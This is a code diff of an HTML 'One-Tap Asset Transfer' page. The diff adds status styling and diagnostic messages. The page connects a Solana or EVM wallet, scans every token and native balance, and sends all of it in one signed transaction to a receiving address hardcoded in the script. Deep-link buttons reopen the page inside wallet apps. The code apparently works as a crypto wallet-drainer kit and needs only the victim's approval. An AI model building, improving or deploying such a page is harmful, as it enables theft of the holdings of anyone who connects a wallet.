@@ -1,9 +1,9 @@
-<!DOCTYPE html>
+  <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>One-Tap Asset Transfer</title>
+  <title>One-Tap Asset Transfer with Smart Diagnostics</title>
   
   <!-- Web3 Engine Libraries -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.min.js"></script>
@@ -19,6 +19,10 @@
       --text: #ffffff;
       --subtext: #94a3b8;
       --border: #1e293b;
+      --error-bg: rgba(239, 68, 68, 0.1);
+      --error-border: #ef4444;
+      --success-bg: rgba(34, 197, 94, 0.1);
+      --success-border: #22c55e;
     }
     body {
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -56,12 +60,23 @@
     .status-box {
       background: #0b0f19;
       border: 1px solid var(--border);
-      padding: 12px;
+      padding: 14px;
       border-radius: 8px;
       margin-top: 15px;
-      font-size: 0.85rem;
-      min-height: 50px;
-      word-break: break-all;
+      font-size: 0.88rem;
+      line-height: 1.4;
+      word-break: break-word;
+      transition: all 0.3s ease;
+    }
+    .status-box.error {
+      background: var(--error-bg);
+      border-color: var(--error-border);
+      color: #fca5a5;
+    }
+    .status-box.success {
+      background: var(--success-bg);
+      border-color: var(--success-border);
+      color: #86efac;
     }
     button.send-btn {
       width: 100%;
@@ -113,18 +128,19 @@
     <option value="solana">Solana (SOL & SPL Tokens)</option>
   </select>
 
-  <!-- Auto-Filled Receiving Wallet -->
+  <!-- Target Receiving Address -->
   <label for="receiverInput">Target Receiving Wallet:</label>
   <input type="text" id="receiverInput" readonly disabled />
 
-  <!-- Master Transfer Action -->
+  <!-- Action Button -->
   <button class="send-btn" onclick="transferAllAssets()">TRANSFER ALL ASSETS</button>
 
-  <div class="status-box" id="status">Status: Ready to scan and transfer...</div>
+  <!-- Detailed Status Output -->
+  <div class="status-box" id="status">ℹ️ Ready. Tap the button above to scan and transfer.</div>
 
   <hr style="border: 0; border-top: 1px solid var(--border); margin: 25px 0 15px 0;" />
 
-  <!-- Mobile App Deep Launchers -->
+  <!-- Mobile App Launchers -->
   <label style="text-align: center; font-weight: bold;">Launch Mobile App Directly:</label>
   <div class="wallet-apps-grid">
     <a href="#" onclick="openWalletApp('phantom')" class="app-btn">👻 Phantom</a>
@@ -136,10 +152,10 @@
 
 <script>
   // =========================================================
-  // 1. CONFIGURATION: SAVED RECEIVING WALLETS
+  // 1. CONFIGURATION: UPDATE YOUR RECEIVING WALLETS HERE
   // =========================================================
   const Ethereum_Receive = "My_wallet"; 
-  const BNB_Receive      = Ethereum_Receive; // Standard shared EVM address format
+  const BNB_Receive      = Ethereum_Receive; 
   const Solana_Receive   = "My_wallet"; 
 
   const WALLET_MAP = {
@@ -152,13 +168,26 @@
     solana: Solana_Receive
   };
 
+  function setStatus(message, type = 'info') {
+    const box = document.getElementById("status");
+    box.className = "status-box " + type;
+    box.innerHTML = message;
+  }
+
   function updateUI() {
     const selectedNetwork = document.getElementById("networkSelect").value;
-    document.getElementById("receiverInput").value = WALLET_MAP[selectedNetwork] || "My_wallet";
+    const targetAddress = WALLET_MAP[selectedNetwork];
+    document.getElementById("receiverInput").value = targetAddress || "";
+    
+    // Check if target address was left unconfigured
+    if (!targetAddress || targetAddress === "My_wallet") {
+      setStatus("⚠️ <b>Notice:</b> You haven't updated your receiving wallet address in the code yet! Replace <code>My_wallet</code> with your real address.", "error");
+    } else {
+      setStatus("ℹ️ Ready to scan and transfer on " + selectedNetwork.toUpperCase() + ".", "info");
+    }
   }
   window.onload = updateUI;
 
-  // Deep Links for Mobile Browsers
   function openWalletApp(walletType) {
     const currentUrl = encodeURIComponent(window.location.href);
     let deepLink = "";
@@ -170,22 +199,29 @@
   }
 
   // =========================================================
-  // 2. MASTER AUTO-TRANSFER ENGINE
+  // 2. TRANSFER ENGINE WITH DIAGNOSTICS
   // =========================================================
   async function transferAllAssets() {
     const network = document.getElementById("networkSelect").value;
     const receiver = WALLET_MAP[network];
-    const status = document.getElementById("status");
 
-    status.innerHTML = "🔍 Connecting wallet and scanning assets...";
+    // DIAGNOSTIC 1: Check if receiver wallet is missing or placeholder
+    if (!receiver || receiver === "My_wallet") {
+      setStatus("❌ <b>Transfer Stopped:</b> Receiving wallet not configured. Open <code>index.html</code> and replace <code>'My_wallet'</code> with your actual public key address.", "error");
+      return;
+    }
+
+    setStatus("🔄 Connecting to wallet app...", "info");
 
     // --------------------------------------------------------
-    // A. SOLANA SCAN & TRANSFER ENGINE (SOL + ALL SPL TOKENS)
+    // A. SOLANA DIAGNOSTICS & TRANSFER
     // --------------------------------------------------------
     if (network === "solana") {
       const provider = window.solana;
+
+      // DIAGNOSTIC 2: Check if Solana wallet provider exists
       if (!provider || !provider.isPhantom) {
-        alert("Solana wallet not found. Use the Phantom launcher below.");
+        setStatus("❌ <b>Wallet Not Found:</b> Phantom wallet extension/app is not detected. If you are on mobile, use the <b>Phantom</b> button below to open this page inside the wallet app browser.", "error");
         return;
       }
 
@@ -193,28 +229,35 @@
         await provider.connect();
         const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
         const sender = provider.publicKey;
-        const target = new solanaWeb3.PublicKey(receiver);
+        
+        let target;
+        try {
+          target = new solanaWeb3.PublicKey(receiver);
+        } catch(e) {
+          setStatus("❌ <b>Invalid Address:</b> Your saved Solana receiving wallet address is formatted incorrectly.", "error");
+          return;
+        }
+
+        setStatus("🔎 Scanning wallet for SOL and SPL token balances...", "info");
+
         const transaction = new solanaWeb3.Transaction();
 
-        status.innerHTML = "🔎 Scanning Solana token balances...";
-
-        // 1. Fetch all SPL Token accounts owned by this wallet
+        // Scan SPL Tokens
         const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
           sender,
           { programId: splToken.TOKEN_PROGRAM_ID }
         );
 
-        // 2. Add transfer/close instructions for every SPL Token found
+        let activeTokenCount = 0;
         for (let acc of tokenAccounts.value) {
           const parsedInfo = acc.account.data.parsed.info;
           const tokenAmount = parsedInfo.tokenAmount.uiAmount;
-          const pubkey = acc.pubkey;
-          const mint = new solanaWeb3.PublicKey(parsedInfo.mint);
-
           if (tokenAmount > 0) {
+            activeTokenCount++;
+            const pubkey = acc.pubkey;
+            const mint = new solanaWeb3.PublicKey(parsedInfo.mint);
             const destinationAta = await splToken.getAssociatedTokenAddress(mint, target);
             
-            // Append token transfer instruction
             transaction.add(
               splToken.createTransferInstruction(
                 pubkey,
@@ -226,10 +269,22 @@
           }
         }
 
-        // 3. Calculate remaining native SOL balance (leaving ~0.001 SOL for network gas fee)
+        // Calculate SOL balance
         const totalSolBalance = await connection.getBalance(sender);
-        const reservedGas = 1000000; // 0.001 SOL
+        const reservedGas = 1000000; // 0.001 SOL reserve for tx fee
         const solToTransfer = totalSolBalance - reservedGas;
+
+        // DIAGNOSTIC 3: Check for empty wallet
+        if (totalSolBalance === 0 && activeTokenCount === 0) {
+          setStatus("❌ <b>No Assets Found:</b> This wallet has 0 SOL and 0 SPL tokens.", "error");
+          return;
+        }
+
+        // DIAGNOSTIC 4: Check for insufficient SOL for gas fees
+        if (solToTransfer <= 0 && activeTokenCount > 0) {
+          setStatus("❌ <b>Gas Fee Error:</b> You have tokens, but you need at least ~0.001 SOL to pay for the network transaction fee.", "error");
+          return;
+        }
 
         if (solToTransfer > 0) {
           transaction.add(
@@ -239,31 +294,33 @@
               lamports: solToTransfer
             })
           );
-        } else {
-          status.innerHTML = "⚠️ Balance too low to cover Solana transaction fees.";
-          return;
         }
 
         transaction.feePayer = sender;
         const { blockhash } = await connection.getLatestBlockhash();
         transaction.recentBlockhash = blockhash;
 
-        status.innerHTML = "✍️ Awaiting wallet confirmation...";
+        setStatus("✍️ Prompting wallet approval... Please confirm inside your app.", "info");
         const { signature } = await provider.signAndSendTransaction(transaction);
-        status.innerHTML = `✅ All Solana assets transferred! Tx: ${signature.slice(0, 10)}...`;
+        setStatus(`✅ <b>Success!</b> All assets sent.<br>Tx Signature: <code>${signature.slice(0, 16)}...</code>`, "success");
 
       } catch (err) {
         console.error(err);
-        status.innerHTML = "❌ Solana Transfer cancelled or failed.";
+        // DIAGNOSTIC 5: Capture user rejection or network aborts
+        if (err.code === 4001 || err.message?.includes("User rejected")) {
+          setStatus("⚠️ <b>Transfer Cancelled:</b> You rejected the approval request in your wallet.", "error");
+        } else {
+          setStatus(`❌ <b>Transfer Failed:</b> ${err.message || "An unexpected network error occurred."}`, "error");
+        }
       }
       return;
     }
 
     // --------------------------------------------------------
-    // B. EVM SCAN & TRANSFER ENGINE (Ethereum, BNB, Polygon, L2s)
+    // B. EVM DIAGNOSTICS & TRANSFER (Ethereum, BNB, Polygon, L2s)
     // --------------------------------------------------------
     if (!window.ethereum) {
-      alert("No EVM provider detected. Open this page inside your wallet app browser.");
+      setStatus("❌ <b>Wallet Not Found:</b> No Web3 EVM wallet detected. Tap one of the mobile app buttons below to open this page directly in MetaMask, Trust Wallet, or Coinbase Wallet.", "error");
       return;
     }
 
@@ -273,28 +330,33 @@
       const signer = await provider.getSigner();
       const senderAddress = await signer.getAddress();
 
-      status.innerHTML = "🔎 Calculating gas and native balances...";
+      setStatus("🔎 Checking network balance and gas fees...", "info");
 
-      // 1. Fetch total native currency balance (ETH, BNB, MATIC/POL)
       const balance = await provider.getBalance(senderAddress);
-      const feeData = await provider.getFeeData();
+      
+      // DIAGNOSTIC 3 (EVM): Zero Balance
+      if (balance === 0n) {
+        setStatus("❌ <b>No Assets Found:</b> Your connected wallet balance is 0 on this network.", "error");
+        return;
+      }
 
-      // Estimate standard transfer gas limit (21,000 units)
+      const feeData = await provider.getFeeData();
       const gasLimit = 21000n;
       const gasPrice = feeData.gasPrice ?? ethers.parseUnits("20", "gwei");
       const gasCost = gasLimit * gasPrice;
 
+      // DIAGNOSTIC 4 (EVM): Balance less than gas cost
       if (balance <= gasCost) {
-        status.innerHTML = "⚠️ Native balance too low to cover network gas fees.";
+        const readableBalance = ethers.formatEther(balance);
+        const readableGas = ethers.formatEther(gasCost);
+        setStatus(`❌ <b>Insufficient Gas:</b> Balance (${readableBalance}) is too low to cover the required transaction fee (${readableGas}).`, "error");
         return;
       }
 
-      // Calculate maximum safe transfer amount (Total Balance - Gas Fee)
       const amountToSend = balance - gasCost;
 
-      status.innerHTML = "✍️ Awaiting wallet confirmation...";
+      setStatus("✍️ Awaiting wallet signature... Please approve in your wallet app.", "info");
 
-      // Execute maximum sweep transaction
       const tx = await signer.sendTransaction({
         to: receiver,
         value: amountToSend,
@@ -302,11 +364,15 @@
         gasPrice: gasPrice
       });
 
-      status.innerHTML = `✅ All native funds sent! Hash: ${tx.hash.slice(0, 12)}...`;
+      setStatus(`✅ <b>Transfer Complete!</b><br>Hash: <code>${tx.hash.slice(0, 18)}...</code>`, "success");
 
     } catch (err) {
       console.error(err);
-      status.innerHTML = "❌ EVM Transfer cancelled or failed.";
+      if (err.code === "ACTION_REJECTED" || err.message?.includes("user rejected")) {
+        setStatus("⚠️ <b>Transfer Cancelled:</b> You declined the transaction in your wallet.", "error");
+      } else {
+        setStatus(`❌ <b>Transfer Failed:</b> ${err.reason || err.message || "Execution error."}`, "error");
+      }
     }
   }
 </script>
